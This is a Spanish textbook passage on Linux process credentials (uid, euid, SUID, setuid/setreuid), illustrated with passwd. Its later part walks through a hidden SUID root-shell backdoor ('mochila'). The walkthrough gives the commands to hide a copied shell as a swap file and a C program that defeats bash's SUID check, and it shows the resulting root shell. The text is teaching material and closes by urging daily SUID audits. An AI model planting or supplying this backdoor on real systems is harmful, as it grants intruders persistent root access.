He citado completamente el item 1.5.3 del libro `Programacion de Sistemas` para mayor entendimiento del capitulo:

Antes de meternos con la comunicación entre procesos me gustaría
comentar algunas curiosidades sobre los permisos en GNU/Linux. Como ya
hemos dicho al principio de este capítulo, mientras un programa se está
ejecutando dispone de una serie de credenciales que le permiten acreditarse
frente al sistema a la hora de acceder a sus recursos, es decir, son como la
tarjeta de acceso en un edificio muy burocratizado como pueda ser el
Pentágono: si tu tarjeta es de nivel 5, no puedes acceder a salas de nivel 6 o
superior, las puertas no se abren (y además es probable que quede un
registro de tus intentos fallidos). Dentro de esas credenciales, las que más se
suelen utilizar son el u id y el g id , así como el euid y el egid . Estas dos parejas
informan de qué usuario real y efectivo está ejecutando el programa en
cuestión, para dotarle de unos privilegios o de otros.Programación de Sistemas
36
Para la mayoría de programas, con el eu id es suficiente: si eres
“efectivamente” el usuario root, tienes privilegios de root durante la
ejecución de esa tarea, a pesar de que tu usuario real sea otro. Esto sucede
mucho en ejecutables que tienen el bit de SUID activado: convierten a quien
los ejecuta en el usuario propietario de ese ejecutable. Si dicho usuario era
root, al ejecutarlos te conviertes momentáneamente en root. Esto permite,
por ejemplo, que un usuario normal pueda cambiar su contraseña, es decir,
modificar el fichero ` / etc / shadow `, a pesar de no tener grandes privilegios en
el sistema. El comando ` passwd ` hace de puerta de enlace, por así llamarlo,
entre la petición del usuario y la modificación del fichero protegido:
```c
txipi@neon:~$ ls -l /etc/shadow
-rw-r----- 1 root shadow 1380 2002-11-12 20:12 /etc/shadow
txipi@neon:~$ passwd txipi
Changing password for txipi
(current) UNIX password:
Bad: new and old password are too similar
(hummmm...)
Enter new UNIX password:
Retype new UNIX password:
Bad: new password is too simple
(arghhh!!!!)
Retype new UNIX password:
Enter new UNIX password:
passwd: password updated successfully
(ufff!!)
txipi@neon:~$ which passwd
/usr/bin/passwd
txipi@neon:~$ ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 25640 2002-10-14 04:05 /usr/bin/passwd
```
Como vemos inicialmente, el fichero `/etc/shadow` está protegido contra
escritura para todos los usuarios excepto para root, y aun así (¡después de
desesperarme un poco!), he podido cambiar mi contraseña, es decir,
modificarlo. Esto es posible gracias a que el programa ` /usr/bin/passwd` que he
utilizado, tiene a root como propietario, y el bit de SUID activado (` -rwsr-xr-
x `).
¿Cómo gestionar todo esto en nuestros programas en C? Utilizando las
siguientes funciones:
```c
uid_t getuid(void);
uid_t geteuid(void);
int setuid(uid_t uid);
int seteuid(uid_t euid);
int setreuid(uid_t ruid, uid_t euid);
```
Con las dos primeras obtenemos tanto el uid como el euid del proceso en
ejecución. Esto puede resultar útil para hacer comprobaciones previas. El
programa “ nmap ”, por ejemplo, comprueba si tienes privilegios de root (es
decir, si euid es 0) antes de intentar realizar ciertas cosas. Las otras tres
funciones sirven para cambiar nuestro uid , euid o ambos, en función de las
posibilidades, esto es, siempre y cuando el sistema nos lo permita: bien
porque somos root, bien porque queremos degradar nuestros privilegios. Las
tres retornan 0 si todo ha ido bien, o –1 si ha habido algún error. Si les
pasamos –1 como parámetro, no harán ningún cambio, por lo tanto:
```c
setuid(uid_t uid) equivale a setreuid(uid_t ruid, -1)
seteuid(uid_t euid) equivale a setreuid(-1, uid_t euid);
```
Analicemos ahora un caso curioso: antiguamente, cuando no se utilizaba
bash como intérprete de comandos, algunos intrusos utilizaban una técnica
que se conoce vulgarmente con el nombre de “mochila” o “puerta trasera”.
Esta técnica se basaba en el hecho de que una vez conseguido un acceso
como root al sistema, se dejaba una puerta trasera para lograr esos
privilegios el resto de veces que se quisiera, de la siguiente forma:
```
neon:~# cd /var/tmp/
neon:/var/tmp# cp /bin/sh .
neon:/var/tmp# chmod +s sh
neon:/var/tmp# mv sh .23erwjitc3tq3.swp
```
Primero conseguían acceso como root (de la forma que fuera),
seguidamente copiaban en un lugar seguro una copia de un intérprete de
comandos, y habilitaban su bit de SUID. Finalmente lo escondían bajo una
apariencia de fichero temporal. La próxima vez que ese intruso accediese al
sistema, a pesar de no ser root y de que root haya parcheado el fallo que dio
lugar a esa escalada de privilegios (fallo en algún servicio, contraseña
sencilla, etc.), utilizando esa “mochila” podrá volver a tener una shell de
root:
```
txipi@neon:~$ /var/tmp/.23erwjitc3tq3.swp
sh-2.05b# whoami
root
sh-2.05b#
```
Actualmente, con bash, esto no pasa. Bash es un poco más precavida y se
cuida mucho de las shells con el bit de SUID activado. Por ello, además de
fijarse sólo en el eu id del usuario que llama a bash, comprueba también el u id .
Utilizando las funciones que hemos visto, seremos capaces de engañar
completamente a bash:

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
int main( int argc, char **argv )
{
uid_t uid, euid;
uid = getuid();
euid = geteuid();
setreuid( euid, euid );
system( "/bin/bash" );
}
return 0;
```
De esta manera, justo antes de llamar a `/bin/bash` nos hemos asegurado
de que tanto el u id como el euid corresponden a root y la “mochila”
funcionará:
```
neon:/var/tmp# gcc mochila.c -o .23erwjitc3tq3.swp
neon:/var/tmp# chmod +s .23erwjitc3tq3.swp
neon:/var/tmp# ls -l .23erwjitc3tq3.swp
-rwsr-sr-x 1 root root 5003 2002-11-12 20:52 .23erwjitc3tq3.swp
neon:/var/tmp# exit
exit
txipi@neon:~$ /var/tmp/.23erwjitc3tq3.swp
sh-2.05b# whoami
root
sh-2.05b#
```
Por este tipo de jueguitos es por los que conviene revisar a diario los
cambios que ha habido en los SUIDs del sistema ;-)`
